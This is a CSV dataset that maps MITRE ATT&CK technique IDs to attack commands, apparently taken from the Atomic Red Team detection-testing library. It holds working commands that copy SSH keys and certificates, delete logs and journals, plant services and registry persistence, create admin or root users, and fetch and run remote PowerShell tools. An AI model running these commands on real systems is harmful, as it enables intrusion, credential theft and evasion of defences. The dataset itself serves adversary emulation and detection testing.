mitre_id,technique_name,command
T1619,Azure - Enumerate Azure Blobs with MicroBurst,"import-module ""pathtoatomicsfolder\..\externalpayloads\invoke-enumerateazureblobs.ps1"" invoke-enumerateazureblobs -base #{base} -permutations ""#{wordlist}"" -outputfile ""#{output_file}"""
T1218,Regasm Uninstall Method Call Test,"c:\windows\microsoft.net\framework\v4.0.30319\csc.exe /r:system.enterpriseservices.dll /out:""#{output_file}"" /target:library ""#{source_file}"" c:\windows\microsoft.net\framework\v4.0.30319\regasm.exe /u #{output_file}"
T1218,Regsvcs Uninstall Method Call Test,"$key = 'bwiaaaakaabsu0eyaaqaaaeaaqbhxtvkseh85e31z64cax+x2pwgc6dhp9vaod13cljtyau9sesuzkvljdhphy5ppg5clhigal7nzbp6quklh0lleq/vw979gwzvagszagvcfpuk6p1y69csr3stlzljjry76jijes4+rhbdwhp99y8qhwrlloc0qu/wxzaffhs2te/pkziituffcp46qxqolr8s3qzhajbnn9tgjkbix8mtget7hd1dc2hxv7dkac531zwqgxb54onuvfbd5p2t+vyvzuhnmay3px0bdxqwefozz+hiik1yudsnoe79zwnpvp1+bn0pk5qcpcs+6zujfrlqpj+nfhllicwej9ut7og3g/p+jpxgn0/+hitolufo7ucjh+wvzau//dzrgny5stqttmlxdhzbosndjpsqnzweufl5+o8ohujbhdm/zq0361mvssvwrmgdpkhggrx+7fbdgpbeq3m15/4zzg343v9nbwt1+qzu+tsvpu0wrvkwizrerjmddehjibowsx4v8aiwx8fppngemnz89tbaq8zbirjffmtynj1ffmknu3lgloefcacyyehpx/tqcbubig/cpcdhps/6sgcccix3tufneedmaqjmlku8x4zhcgjx6fpvk7qeeuvyv0ogkvnor9b/wkqhihjkzg+z6nwhmomyv5vmtz0jlm5azq6ypwmfzanmtl6kdzkv8l1yn2tkkjxeowulxnlibpelssjyuicplrctpggsxpgiht3rpz9tblzuefrfnlnihfvjni53yg4=' $content = [system.convert]::frombase64string($key) set-content $env:temp\key.snk -value $content -encoding byte c:\windows\microsoft.net\framework\v4.0.30319\csc.exe /r:system.enterpriseservices.dll /out:""#{output_file}"" /target:library /keyfile:$env:temp\key.snk #{source_file} c:\windows\microsoft.net\framework\v4.0.30319\regsvcs.exe #{output_file}"
T1547,Create a new time provider,"net stop w32time copy-item ""$pathtoatomicsfolder\t1547.003\bin\atomictest.dll"" c:\users\public\atomictest.dll reg add ""hkey_local_machine\system\currentcontrolset\services\w32time\timeproviders\atomictest"" /t reg_sz /v ""dllname"" /d ""c:\users\public\atomictest.dll"" /f reg add ""hkey_local_machine\system\currentcontrolset\services\w32time\timeproviders\atomictest"" /t reg_dword /v ""enabled"" /d ""1"" /f reg add ""hkey_local_machine\system\currentcontrolset\services\w32time\timeproviders\atomictest"" /t reg_dword /v ""inputprovider"" /d ""1"" /f net start w32time"
T1547,Edit an existing time provider,"net stop w32time copy-item ""$pathtoatomicsfolder\t1547.003\bin\atomictest.dll"" c:\users\public\atomictest.dll reg add ""hkey_local_machine\system\currentcontrolset\services\w32time\timeproviders\ntpserver"" /t reg_sz /v ""dllname"" /d ""c:\users\public\atomictest.dll"" /f reg add ""hkey_local_machine\system\currentcontrolset\services\w32time\timeproviders\ntpserver"" /t reg_dword /v ""enabled"" /d ""1"" /f reg add ""hkey_local_machine\system\currentcontrolset\services\w32time\timeproviders\ntpserver"" /t reg_dword /v ""inputprovider"" /d ""1"" /f net start w32time"
T1552,Private Keys,dir c:\ /b /s .key | findstr /e .key
T1552,Discover Private SSH Keys,find #{search_path} -name id_rsa 2>/dev/null >> #{output_file} exit 0
T1552,Copy Private SSH Keys with CP,mkdir #{output_folder} find #{search_path} -name id_rsa 2>/dev/null -exec cp --parents {} #{output_folder} \; exit 0
T1552,Copy Private SSH Keys with CP (freebsd),mkdir #{output_folder} find #{search_path} -name id_rsa 2>/dev/null -exec gcp --parents {} #{output_folder} \;
T1552,Copy Private SSH Keys with rsync,mkdir #{output_folder} find #{search_path} -name id_rsa 2>/dev/null -exec rsync -r {} #{output_folder} \; exit 0
T1552,Copy Private SSH Keys with rsync (freebsd),mkdir #{output_folder} find #{search_path} -name id_rsa 2>/dev/null -exec rsync -r {} #{output_folder} \;
T1552,Copy the users GnuPG directory with rsync,mkdir #{output_folder} find #{search_path} -type d -name '.gnupg' 2>/dev/null -exec rsync -rr {} #{output_folder} \; exit 0
T1552,Copy the users GnuPG directory with rsync (freebsd),mkdir #{output_folder} find #{search_path} -type d -name '.gnupg' 2>/dev/null -exec rsync -rr {} #{output_folder} \;
T1552,ADFS token signing and encryption certificates theft - Local,"import-module aadinternals -force export-aadintadfscertificates get-childitem | where-object {$_ -like ""adfs*""} write-host ""`ncertificates retrieved successfully"""
T1552,ADFS token signing and encryption certificates theft - Remote,"import-module activedirectory -force import-module aadinternals -force | out-null #get configuration $dcservername = (get-addomaincontroller).hostname $svc = get-adobject -filter * -properties objectguid,objectsid | where-object name -eq ""#{adfs_service_account_name}"" $pword = convertto-securestring -string ""#{replication_password}"" -asplaintext -force $credential = new-object -typename system.management.automation.pscredential -argumentlist #{replication_user}, $pword # use dcsync to fetch the adfs service account's nt hash $hash = get-aadintadusernthash -objectguid $svc.objectguid -credentials $credential -server $dcservername -ashex $adfsconfig = export-aadintadfsconfiguration -hash $hash -sid $svc.objectsid.value -server #{adfs_server_name} # get certificates decryption key $configuration = [xml]$adfsconfig $group = $configuration.servicesettingsdata.policystore.dkmsettings.group $container = $configuration.servicesettingsdata.policystore.dkmsettings.containername $parent = $configuration.servicesettingsdata.policystore.dkmsettings.parentcontainerdn $base = ""ldap://cn=$group,$container,$parent"" $adsearch = [system.directoryservices.directorysearcher]::new([system.directoryservices.directoryentry]::new($base)) $adsearch.filter = '(name=cryptopolicy)' $adsearch.propertiestoload.clear() $adsearch.propertiestoload.add(""displayname"") | out-null $aduser = $adsearch.findone() $keyobjectguid = $aduser.properties[""displayname""] $adsearch.propertiestoload.clear() $adsearch.propertiestoload.add(""thumbnailphoto"") | out-null $adsearch.filter=""(l=$keyobjectguid)"" $aduser=$adsearch.findone() $key=[byte[]]$aduser.properties[""thumbnailphoto""][0] # get encrypted certificates from configuration and decrypt them export-aadintadfscertificates -configuration $adfsconfig -key $key get-childitem | where-object {$_ -like ""adfs*""} write-host ""`ncertificates retrieved successfully"""
T1552,CertUtil ExportPFX,iex (iwr 'https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/t1553.004/src/remotecerttrust.ps1' -usebasicparsing) certutil.exe -p #{password} -exportpfx root 1f3d38f280635f275be92b87cf83e40e40458400 #{output}
T1552,Export Root Certificate with Export-PFXCertificate,"$mypwd = convertto-securestring -string ""atomicredteam"" -force -asplaintext $cert = new-selfsignedcertificate -dnsname atomicredteam.com -certstorelocation cert:\localmachine\my set-location cert:\localmachine\my get-childitem -path $cert.thumbprint | export-pfxcertificate -filepath #{pfx_path} -password $mypwd"
T1552,Export Root Certificate with Export-Certificate,$cert = new-selfsignedcertificate -dnsname atomicredteam.com -certstorelocation cert:\localmachine\my set-location cert:\localmachine\my export-certificate -type cert -cert cert:\localmachine\my\$($cert.thumbprint) -filepath #{pfx_path}
T1552,Export Certificates with Mimikatz,"""#{mimikatz_exe}"" ""crypto::certificates /systemstore:local_machine /store:my /export"" exit"
T1070,Indicator Removal using FSUtil,fsutil usn deletejournal /d c:
T1070,Indicator Manipulation using FSUtil,"if (-not (test-path ""#{file_to_manipulate}"")) { new-item ""#{file_to_manipulate}"" -force } echo ""1234567890"" > ""#{file_to_manipulate}"" fsutil file setzerodata offset=0 length=#{file_data_length} ""#{file_to_manipulate}"""
T1070,Copy and Delete Mailbox Data on Windows,"new-item -path ""c:\users\$env:username\appdata\local\comms\unistore\data\copy"" -itemtype directory -erroraction ignore get-childitem -path ""c:\users\$env:username\appdata\local\comms\unistore\data"" -exclude copy | foreach-object { copy-item -path $_.fullname -destination ""c:\users\$env:username\appdata\local\comms\unistore\data\copy"" -recurse -force -erroraction ignore } remove-item -path ""c:\users\$env:username\appdata\local\comms\unistore\data\copy"" -recurse -force -erroraction ignore"
T1070,Copy and Delete Mailbox Data on Linux,"mkdir -p /var/spool/mail/copy && for file in /var/spool/mail/*; do if [ ""$(basename ""$file"")"" != ""copy"" ]; then cp -r ""$file"" /var/spool/mail/copy/; fi; done && rm -rf /var/spool/mail/copy/*"
T1070,Copy and Delete Mailbox Data on macOS,mkdir ~/library/mail/copy cp -r ~/library/mail/* ~/library/mail/copy rm -rf ~/library/mail/copy/*
T1070,Copy and Modify Mailbox Data on Windows,"new-item -path ""c:\users\$env:username\appdata\local\comms\unistore\data\copy"" -itemtype directory -erroraction ignore get-childitem -path ""c:\users\$env:username\appdata\local\comms\unistore\data"" -exclude copy | foreach-object { copy-item -path $_.fullname -destination ""c:\users\$env:username\appdata\local\comms\unistore\data\copy"" -recurse -force -erroraction ignore } get-childitem -path ""c:\users\$env:username\appdata\local\comms\unistore\data\copy"" -file | foreach-object { add-content -path $_.fullname -value ""modification for atomic red test"" -erroraction ignore }"
T1070,Copy and Modify Mailbox Data on Linux,"mkdir -p /var/spool/mail/copy; for file in /var/spool/mail/*; do if [ ""$(basename ""$file"")"" != ""copy"" ]; then cp -r ""$file"" /var/spool/mail/copy/; if [ -f ""/var/spool/mail/copy/$(basename ""$file"")"" ]; then echo ""modification for atomic red test"" >> ""/var/spool/mail/copy/$(basename ""$file"")""; fi; fi; done"
T1070,Copy and Modify Mailbox Data on macOS,"mkdir ~/library/mail/copy cp -r ~/library/mail/* ~/library/mail/copy echo ""manipulated data"" > ~/library/mail/copy/manipulated.txt"
T1547,Add Port Monitor persistence in Registry,"reg add ""hklm\system\currentcontrolset\control\print\monitors\atomicredteam"" /v ""driver"" /d ""#{monitor_dll}"" /t reg_sz /f"
T1218,CMSTP Executing Remote Scriptlet,"cmstp.exe /s ""#{inf_file_path}"""
T1218,CMSTP Executing UAC Bypass,"cmstp.exe /s ""#{inf_file_uac}"" /au"
T1552,List All Secrets,kubectl get secrets --all-namespaces
T1552,ListSecrets,kubectl get secrets -n #{namespace}
T1552,Cat the contents of a Kubernetes service account token file,kubectl --context kind-atomic-cluster exec atomic-pod -- cat /run/secrets/kubernetes.io/serviceaccount/token
T1202,Indirect Command Execution - pcalua.exe,pcalua.exe -a #{process} pcalua.exe -a #{payload_path}
T1202,Indirect Command Execution - forfiles.exe,forfiles /p c:\windows\system32 /m notepad.exe /c #{process}
T1202,Indirect Command Execution - conhost.exe,"conhost.exe ""#{process}"""
T1202,Indirect Command Execution - Scriptrunner.exe,"scriptrunner.exe -appvscript ""#{payload_path}"""
T1202,Indirect Command Execution - RunMRU Dialog,"# copy command to clipboard set-clipboard -value '#{command}' # open run dialog start-process -filepath ""powershell"" -argumentlist ""-c (new-object -comobject 'shell.application').filerun()"" -windowstyle hidden # wait for run dialog to open start-sleep -seconds 1 # paste command and execute add-type -assemblyname system.windows.forms [system.windows.forms.sendkeys]::sendwait('^v') start-sleep -milliseconds 500 [system.windows.forms.sendkeys]::sendwait('{enter}')"
T1595,Web Server Wordlist Scan,"import-module ""pathtoatomicsfolder/t1595.003/src/webserverscan.ps1"" invoke-wordlistscan -target ""#{target}"" -wordlist ""#{wordlist}"" -timeout ""#{request_timeout}"" -outputfile ""#{output_file}"" write-host ""scan complete. results saved to: #{output_file}"""
T1127,MSBuild Bypass Using Inline Tasks (C#),"#{msbuildpath}\#{msbuildname} ""#{filename}"""
T1127,MSBuild Bypass Using Inline Tasks (VB),"#{msbuildpath}\#{msbuildname} ""#{filename}"""
T1564,New-Inbox Rule to Hide E-mail in M365,"import-module exchangeonlinemanagement $password = convertto-securestring -string ""#{auth_password}"" -asplaintext -force $credential = new-object -typename system.management.automation.pscredential -argumentlist ""#{auth_username}"", $password connect-exchangeonline -credential $credential -erroraction:silentlycontinue new-inboxrule -mailbox #{target_mailbox} -name #{mail_rulename} -subjectorbodycontainswords (""phish"",""malware"",""hacked"") -confirm:$false -deletemessage:$true"
T1543,Modify Fax service to run PowerShell,"sc config #{service_name} binpath= ""c:\windows\system32\windowspowershell\v1.0\powershell.exe -noexit -c \""write-host 't1543.003 test'\"""" sc start #{service_name}"
T1543,Service Installation CMD,"sc.exe create #{service_name} binpath= ""#{binary_path}"" start=#{startup_type} type=#{service_type} sc.exe start #{service_name}"
T1543,Service Installation PowerShell,"new-service -name ""#{service_name}"" -binarypathname ""#{binary_path}"" start-service -name ""#{service_name}"""
T1543,TinyTurla backdoor service w64time,"copy ""#{dllfilename}"" %systemroot%\system32\ sc create w64time binpath= ""c:\windows\system32\svchost.exe -k timeservice"" type= share start=auto sc config w64time displayname= ""windows 64 time"" sc description w64time ""maintain date and time synch on all clients and services in the network"" reg add ""hklm\software\microsoft\windows nt\currentversion\svchost"" /v timeservice /t reg_multi_sz /d ""w64time"" /f reg add ""hklm\system\currentcontrolset\services\w64time\parameters"" /v servicedll /t reg_expand_sz /d ""%systemroot%\system32\w64time.dll"" /f sc start w64time"
T1543,Remote Service Installation CMD,"sc.exe \\#{remote_host} create #{service_name} binpath= ""#{binary_path}"" start=#{startup_type} type=#{service_type} sc.exe \\#{remote_host} start #{service_name}"
T1543,Modify Service to Run Arbitrary Binary (Powershell),"stop-service -name ""#{service_name}"" -force -erroraction silentlycontinue | out-null set-servicebinarypath -name ""#{service_name}"" -path ""#{new_bin_path}"" start-service -name ""#{service_name}"" -erroraction silentlycontinue | out-null"
T1071,Malicious User Agents - Powershell,"invoke-webrequest #{domain} -useragent ""httpbrowser/1.0"" | out-null invoke-webrequest #{domain} -useragent ""wget/1.9+cvs-stable (red hat modified)"" | out-null invoke-webrequest #{domain} -useragent ""opera/8.81 (windows nt 6.0; u; en)"" | out-null invoke-webrequest #{domain} -useragent ""*<|>*"" | out-null"
T1071,Malicious User Agents - CMD,"#{curl_path} -s -a ""httpbrowser/1.0"" -m3 #{domain} >nul 2>&1 #{curl_path} -s -a ""wget/1.9+cvs-stable (red hat modified)"" -m3 #{domain} >nul 2>&1 #{curl_path} -s -a ""opera/8.81 (windows nt 6.0; u; en)"" -m3 #{domain} >nul 2>&1 #{curl_path} -s -a ""*<|>*"" -m3 #{domain} >nul 2>&1"
T1071,Malicious User Agents - Nix,"curl -s -a ""httpbrowser/1.0"" -m3 #{domain} curl -s -a ""wget/1.9+cvs-stable (red hat modified)"" -m3 #{domain} curl -s -a ""opera/8.81 (windows nt 6.0; u; en)"" -m3 #{domain} curl -s -a ""*<|>*"" -m3 #{domain}"
T1136,Create a user account on a Linux system,useradd -m -n -r -s /bin/bash -c evil_account #{username}
T1136,Create a user account on a FreeBSD system,pw useradd #{username} -s /usr/sbin/nologin -d /nonexistent -c evil_account
T1136,Create a user account on a MacOS system,"dscl . -create /users/#{username} dscl . -create /users/#{username} usershell /bin/zsh dscl . -create /users/#{username} realname ""#{realname}"" dscl . -create /users/#{username} uniqueid ""1010"" dscl . -create /users/#{username} primarygroupid 80 dscl . -create /users/#{username} nfshomedirectory /users/#{username}"
T1136,Create a new user in a command prompt,"net user /add ""#{username}"" ""#{password}"""
T1136,Create a new user in PowerShell,"new-localuser -name ""#{username}"" -nopassword"
T1136,Create a new user in Linux with `root` UID and GID.,"useradd -g 0 -m -d /root -s /bin/bash #{username} if [ $(cat /etc/os-release | grep -i 'name=""ubuntu""') ]; then echo ""#{username}:#{password}"" | sudo chpasswd; else echo ""#{password}"" | passwd --stdin #{username}; fi;"
T1136,Create a new user in FreeBSD with `root` GID.,"pw useradd #{username} -g 0 -d /root -s /bin/sh echo ""#{password}"" | pw usermod #{username} -h 0"
T1136,Create a new Windows admin user,"net user /add ""#{username}"" ""#{password}"" net localgroup administrators ""#{username}"" /add"
T1136,Create a new Windows admin user via .NET,iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/0xv1n/dotnetfun/9b3b0d11d1c156909c0b1823cff3004f80b89b1f/persistence/createnewlocaladmin_art.ps1')
T1136,Create a Linux user via kubectl in a Pod,kubectl run #{pod_name} --image=#{image_name} --restart=never --rm -it -- sh -lc 'adduser -d #{username} && id #{username}'
T1572,DNS over HTTPS Large Query Volume,"for($i=0; $i -le #{query_volume}; $i++) { (invoke-webrequest ""#{doh_server}?name=#{subdomain}.$(get-random -minimum 1 -maximum 999999).#{domain}&type=#{query_type}"" -usebasicparsing).content }"
T1572,DNS over HTTPS Regular Beaconing,"set-location ""pathtoatomicsfolder"" .\t1572\src\t1572-doh-beacon.ps1 -dohserver #{doh_server} -domain #{domain} -subdomain #{subdomain} -querytype #{query_type} -c2interval #{c2_interval} -c2jitter #{c2_jitter} -runtime #{runtime}"
T1572,DNS over HTTPS Long Domain Query,"set-location ""pathtoatomicsfolder"" .\t1572\src\t1572-doh-domain-length.ps1 -dohserver #{doh_server} -domain #{domain} -subdomain #{subdomain} -querytype #{query_type}"
T1572,run ngrok,c:\users\public\ngrok\ngrok.exe config add-authtoken #{api_token} | out-null start-job -scriptblock { c:\users\public\ngrok\ngrok.exe tcp #{port_num} } | out-null start-sleep -s 5 stop-job -name job1 | out-null
T1572,Microsoft Dev tunnels (Linux/macOS),#{binary_path} host -p #{port} &
T1572,VSCode tunnels (Linux/macOS),nohup code tunnel --accept-server-license-terms #{additional_args} >/dev/null 2>&1 &
T1572,Cloudflare tunnels (Linux/macOS),nohup #{binary_path} tunnel --url #{url_to_tunnel} #{additional_args} >/dev/null 2>&1 &
T1135,Network Share Discovery,df -ah smbutil view -g //#{computer_name} showmount #{computer_name}
T1135,Network Share Discovery - linux,smbstatus --shares
T1135,Network Share Discovery - FreeBSD,smbstatus --shares
T1135,Network Share Discovery command prompt,net view \\#{computer_name}
T1135,Network Share Discovery PowerShell,get-smbshare
T1135,View available share drives,net share
T1135,Share Discovery with PowerView,[net.servicepointmanager]::securityprotocol = [net.securityprotocoltype]::tls12 iex (iwr 'https://raw.githubusercontent.com/powershellmafia/powersploit/f94a5d298a1b4c5dfb1f30a246d9c73d13b22888/recon/powerview.ps1' -usebasicparsing); find-domainshare -checkshareaccess -verbose
T1135,PowerView ShareFinder,"import-module ""pathtoatomicsfolder\..\externalpayloads\powerview.ps1"" invoke-sharefinder #{parameters}"
T1135,WinPwn - shareenumeration,iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/s3cur3th1ssh1t/winpwn/121dcee26a7aca368821563cbe92b2b5638c5773/winpwn.ps1') shareenumeration -noninteractive -consoleoutput
T1135,Network Share Discovery via dir command,dir \\#{computer_ip}\c$ dir \\#{computer_ip}\admin$ dir \\#{computer_ip}\ipc$
T1135,Enumerate All Network Shares with SharpShares,"cmd /c '#{sharp_path}' /ldap:all | out-file -filepath ""#{output_path}"""
T1135,Enumerate All Network Shares with Snaffler,"invoke-expression 'cmd /c start powershell -command { cmd /c ""#{snaffler_path}"" -a -o ""#{output_path}"" }; start-sleep 90; stop-process -name ""snaffler""'"
T1556,Install and Register Password Filter DLL,"reg.exe export hklm\system\currentcontrolset\control\lsa\ ""pathtoatomicsfolder\t1556.002\lsa_backup.reg"" $passwordfiltername = (copy-item ""#{dll_path}\#{dll_name}"" -destination ""c:\windows\system32"" -passthru).basename $lsakey = get-item ""hklm:\system\currentcontrolset\control\lsa\"" $notificationpackagesvalues = $lsakey.getvalue(""notification packages"") $notificationpackagesvalues += $passwordfiltername set-itemproperty ""hklm:\system\currentcontrolset\control\lsa\"" ""notification packages"" $notificationpackagesvalues"
T1556,Install Additional Authentication Packages,"reg.exe export hklm\system\currentcontrolset\control\lsa\ ""pathtoatomicsfolder\t1556.002\lsa_backup.reg"" $passwordfiltername = (copy-item ""#{dll_path}\#{dll_name}"" -destination ""c:\windows\system32"" -passthru).basename $lsakey = get-item ""hklm:\system\currentcontrolset\control\lsa\"" $authenticationpackagesvalues = $lsakey.getvalue(""authentication packages"") $authenticationpackagesvalues += $passwordfiltername set-itemproperty ""hklm:\system\currentcontrolset\control\lsa\"" ""authentication packages"" $authenticationpackagesvalues"
T1592,Enumerate PlugNPlay Camera,"get-ciminstance -query ""select * from win32_pnpentity where (pnpclass = 'image' or pnpclass = 'camera')"""
T1218,Compiled HTML Help Local Payload,"hh.exe ""#{local_chm_file}"""
T1218,Compiled HTML Help Remote Payload,hh.exe #{remote_chm_file}
T1218,Invoke CHM with default Shortcut Command Execution,invoke-athcompiledhelp -hhfilepath #{hh_file_path} -chmfilepath #{chm_file_path}
T1218,Invoke CHM with InfoTech Storage Protocol Handler,invoke-athcompiledhelp -infotechstoragehandler #{infotech_storage_handler} -hhfilepath #{hh_file_path} -chmfilepath #{chm_file_path}
T1218,Invoke CHM Simulate Double click,invoke-athcompiledhelp -simulateuserdoubleclick -chmfilepath #{chm_file_path}
T1218,Invoke CHM with Script Engine and Help Topic,invoke-athcompiledhelp -scriptengine #{script_engine} -infotechstoragehandler #{infotech_storage_handler} -topicextension #{topic_extension} -hhfilepath #{hh_file_path} -chmfilepath #{chm_file_path}
T1218,Invoke CHM Shortcut Command with ITS and Help Topic,invoke-athcompiledhelp -executeshortcutcommand -infotechstoragehandler #{infotech_storage_handler} -topicextension #{topic_extension} -hhfilepath #{hh_file_path} -chmfilepath #{chm_file_path}
T1218,Decompile Local CHM File,"hh.exe -decompile %temp% ""#{local_chm_file}"""
T1546,Change Default File Association,assoc #{extension_to_change}=#{target_extension_handler}
T1071,DNS Large Query Volume,"for($i=0; $i -le #{query_volume}; $i++) { resolve-dnsname -type ""#{query_type}"" ""#{subdomain}-$(get-random -minimum 1 -maximum 999999).#{domain}"" -quicktimeout}"
T1071,DNS Regular Beaconing,"set-location ""pathtoatomicsfolder"" .\t1071.004\src\t1071-dns-beacon.ps1 -domain #{domain} -subdomain #{subdomain} -querytype #{query_type} -c2interval #{c2_interval} -c2jitter #{c2_jitter} -runtime #{runtime}"
T1071,DNS Long Domain Query,"set-location ""pathtoatomicsfolder"" .\t1071.004\src\t1071-dns-domain-length.ps1 -domain #{domain} -subdomain #{subdomain} -querytype #{query_type}"
T1071,DNS C2,iex (new-object system.net.webclient).downloadstring('https://raw.githubusercontent.com/lukebaggett/dnscat2-powershell/45836819b2339f0bb64eaf294f8cc783635e00c6/dnscat2.ps1') start-dnscat2 -domain #{domain} -dnsserver #{server_ip}
T1114,Office365 - Remote Mail Collected,"$ss = convertto-securestring ""#{password}"" -asplaintext -force $cred = new-object pscredential -argumentlist '#{username}', $ss $param = @{ credential = $cred force = $true } $null = connect-azaccount @param $token = (get-azaccesstoken -resourcetypename msgraph -erroraction stop).token $cert = new-selfsignedcertificate -subject ""cn=powershell application"" -certstorelocation ""cert:\currentuser\my"" -keyexportpolicy exportable -keyspec signature -keylength 2048 -keyalgorithm rsa -hashalgorithm sha256 $reqresourceaccess = ( @{ ""resourceaccess"" = (@{""id""= ""570282fd-fa5c-430d-a7fd-fc8dc98a9dca""; ""type""= ""scope""}, @{ ""id""= ""7427e0e9-2fba-42fe-b0c0-848c9e6a8182""; ""type""= ""scope""}, @{""id""= ""37f7f235-527c-4136-accd-4a02d197296e""; ""type""= ""scope""}, @{""id""= ""14dad69e-099b-42c9-810b-d002981feec1""; ""type""= ""scope""}, @{ ""id""= ""e1fe6dd8-ba31-4d61-89e7-88639da4683d""; ""type""= ""scope""}, @{ ""id""= ""810c84a8-4a9e-49e6-bf7d-12d183f40d01""; ""type""= ""role""}); ""resourceappid"" = ""00000003-0000-0000-c000-000000000000"" }) connect-mggraph -accesstoken $token $context = get-mgcontext $users = get-mguser $app = new-mgapplication -displayname ""t1114.002 atomic test #1 - office365 - remote email collection"" -requiredresourceaccess $reqresourceaccess -web @{ redirecturis=""http://localhost""; } -keycredentials @(@{ type=""asymmetricx509cert""; usage=""verify""; key=$cert.rawdata }) new-mgserviceprincipal -appid $app.appid -additionalproperties @{} | out-null $resourcespn = get-mgserviceprincipal -filter ""appid eq '$($app.appid)'"" $graphapiapp = get-mgserviceprincipal -filter ""displayname eq 'microsoft graph'"" $mailrole = $graphapiapp.approles|where-object value -eq ""mail.read"" new-mgserviceprincipalapproleassignment -serviceprincipalid $resourcespn.id -principalid $resourcespn.id -resourceid $graphapiapp.id -approleid $mailrole.id $mailbox1 = ""#{1st_target_mailbox}"" $mailbox2 = ""#{2nd_target_mailbox}"" $mailbox3 = ""#{3rd_target_mailbox}"" [system.collections.arraylist]$selectusers = @() foreach ($user in $users) {if (($user.mail -eq $mailbox1) -or ($user.mail -eq $mailbox2) -or ($user.mail -eq $mailbox3)){$selectusers.add($user.id)}} connect-mggraph -clientid $app.appid -tenantid $context.tenantid -certificatename $cert.subjectname.name foreach ($user in $selectusers) { $url= ""https://graph.microsoft.com/v1.0/users/$($user)/messages"" ; invoke-mggraphrequest -uri $url -method get -outputtype psobject}"
T1482,Windows - Discover domain trusts with dsquery,"dsquery * -filter ""(objectclass=trusteddomain)"" -attr *"
T1482,Windows - Discover domain trusts with nltest,nltest /domain_trusts nltest /trusted_domains
T1482,Powershell enumerate domains and forests,"import-module ""pathtoatomicsfolder\..\externalpayloads\powerview.ps1"" get-netdomaintrust get-netforesttrust get-addomain get-adgroupmember administrators -recursive ([system.directoryservices.activedirectory.domain]::getcurrentdomain()).getalltrustrelationships()"
T1482,Adfind - Enumerate Active Directory OUs,"""pathtoatomicsfolder\..\externalpayloads\adfind.exe"" -f (objectcategory=organizationalunit) #{optional_args}"
T1482,Adfind - Enumerate Active Directory Trusts,"""pathtoatomicsfolder\..\externalpayloads\adfind.exe"" #{optional_args} -gcb -sc trustdmp"
T1482,Get-DomainTrust with PowerView,[net.servicepointmanager]::securityprotocol = [net.securityprotocoltype]::tls12 iex (iwr 'https://raw.githubusercontent.com/powershellmafia/powersploit/f94a5d298a1b4c5dfb1f30a246d9c73d13b22888/recon/powerview.ps1' -usebasicparsing); get-domaintrust -verbose
T1482,Get-ForestTrust with PowerView,[net.servicepointmanager]::securityprotocol = [net.securityprotocoltype]::tls12 iex (iwr 'https://raw.githubusercontent.com/powershellmafia/powersploit/f94a5d298a1b4c5dfb1f30a246d9c73d13b22888/recon/powerview.ps1' -usebasicparsing); get-foresttrust -verbose
T1482,TruffleSnout - Listing AD Infrastructure,"""#{trufflesnout_path}"" forest -n #{domain} ""#{trufflesnout_path}"" domain -n #{domain}"
T1574,Execution of program.exe as service with unquoted service path,"copy ""#{service_executable}"" ""c:\program files\windows_service.exe"" copy ""#{service_executable}"" ""c:\program.exe"" sc create ""example service"" binpath= ""c:\program files\windows_service.exe"" displayname= ""example service"" start= auto sc start ""example service"""
T1119,Automated Collection Command Prompt,mkdir %temp%\t1119_command_prompt_collection >nul 2>&1 dir c: /b /s .docx | findstr /e .docx for /r c:\ %f in (*.docx) do copy /y %f %temp%\t1119_command_prompt_collection
T1119,Automated Collection PowerShell,new-item -path $env:temp\t1119_powershell_collection -itemtype directory -force | out-null get-childitem -recurse -include *.doc | % {copy-item $_.fullname -destination $env:temp\t1119_powershell_collection}
T1119,Recon information for export with PowerShell,get-service > $env:temp\t1119_1.txt get-childitem env: > $env:temp\t1119_2.txt get-process > $env:temp\t1119_3.txt
T1119,Recon information for export with Command Prompt,sc query type=service > %temp%\t1119_1.txt doskey /history > %temp%\t1119_2.txt wmic process list > %temp%\t1119_3.txt tree c:\atomicredteam\atomics > %temp%\t1119_4.txt
T1562,AWS - CloudTrail Changes,aws cloudtrail update-trail --name #{cloudtrail_name} --s3-bucket-name #{s3_bucket_name} --is-multi-region-trail --region #{region} aws cloudtrail stop-logging --name #{cloudtrail_name} --region #{region} aws cloudtrail delete-trail --name #{cloudtrail_name} --region #{region}
T1562,Azure - Eventhub Deletion,"$secure_pwd = ""#{password}"" | convertto-securestring -asplaintext -force $creds = new-object system.management.automation.pscredential -argumentlist ""#{username}"", $secure_pwd connect-azuread -credential $creds remove-azeventhub -resourcegroupname #{resource_group} -namespace #{name_space_name} -name #{event_hub_name}"
